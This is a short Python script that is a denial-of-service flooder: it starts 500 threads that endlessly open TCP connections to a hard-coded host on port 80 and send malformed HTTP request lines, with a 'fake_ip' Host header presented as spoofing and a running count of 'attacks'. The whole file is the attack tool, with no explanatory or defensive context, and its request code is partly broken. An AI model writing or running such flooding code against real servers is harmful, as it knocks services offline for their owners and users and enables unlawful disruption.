import threading
import socket

target = '172.17.0.1'
port = 80
fake_ip = '182.21.20.32'

already_attacked = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + " HTTP/1.1\r\n").encode('ascii'), (fake_ip, port))
        s.close()

        global already_attacked
        already_attacked += 1
        print(already_attacked)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
